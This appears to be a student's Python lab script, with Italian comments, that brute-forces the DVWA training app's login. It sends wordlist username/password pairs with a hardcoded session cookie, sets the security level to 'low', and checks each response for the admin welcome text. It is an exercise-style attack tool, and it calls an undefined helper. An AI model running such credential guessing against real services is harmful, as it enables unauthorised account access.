import requests
from bs4 import BeautifulSoup
# Sono tutte le variabili universali
USERNAME = "admin"
PASSWORD = "password"
PHP_ID = "bc04affe3e83047d8b5508b503a4b235"
DIFFICULTY = "low"
#devo ancora capire che base_url bisogna mettere "http://192.168.1.85/dvwa" o altro
BASE_URL = "http://192.168.1.85/dvwa"
#cambiare a seconda del file in cui c'è la lista di utenti o password
USERNAME_WORDLISTS  = "/home/kali/Desktop/Build_week/nome1.txt"
PASSWORD_WORDLISTS  = "/home/kali/Desktop/Build_week/pass.txt"

def main():
    bruteforce_low()


def bruteforce_low():
    global USERNAME_WORDLISTS, PASSWORD_WORDLISTS
    
    usernames = get_wordlist(USERNAME_WORDLISTS)
    passwords = get_wordlist(PASSWORD_WORDLISTS)
    print('Gli utenti sono:',usernames)
    print('Le password sono:',passwords)
    
    print(f"[INFORMAZIONE PRINCIPALE]: Ci sono: {len(usernames)} usernames nel file")
    print(f"[INFORMAZIONE PRINCIPALE]: Ci sono: {len(passwords)} passwords nel file")
    
    for user in usernames:
        for password in passwords:
            print(f"[INFO]: Testing: ({user}:{password})")
            if check_credentials(user, password):
                print(f"[INFO]: Found credentials: ({user}:{password})")
                break
                
#va a prendere i nimi dalla cartella                
def get_wordlist(wordlist_path):
    return open(wordlist_path, "r").read().splitlines()
    

def http_get(url, difficulty, headers=None, params=None, cookies=None, timeout=None):
    global PHP_ID, USERNAME, PASSWORD
    
    if not PHP_ID:
        PHP_ID = get_auth_cookie(url, USERNAME, PASSWORD)

    if difficulty not in ["low", "medium", "high"]:
        print(f"[ERROR]: difficulty value ({difficulty}) not supported")
        exit()
        
    custom_headers = {
        "Cookie": f"PHPSESSID={PHP_ID}; security={difficulty};" + create_cookie(cookies),
    }

    if headers:
        for h in headers:
            custom_headers[h] = headers[h]    
    
    return requests.get(url, headers=custom_headers, params=params, timeout=timeout)
    
def check_credentials(username, password):
    global BASE_URL, DIFFICULTY
    #cambio url finale , invece di  /vulnerabilities/brute/
    URL = BASE_URL + "/login.php"
    #print(URL ,'credenziali') #
    params = {"username": username, "password": password, "Login": "Login"}
    r = http_get(URL, DIFFICULTY, params=params)
    return "Welcome to the password protected area admin" in r.text
    
def create_cookie(cookies):
    if not cookies:
        return ""
    else:
        return ";".join([f"{key}={cookies[key]}" for key in cookies])
            
    
if __name__ == "__main__":
    main()    
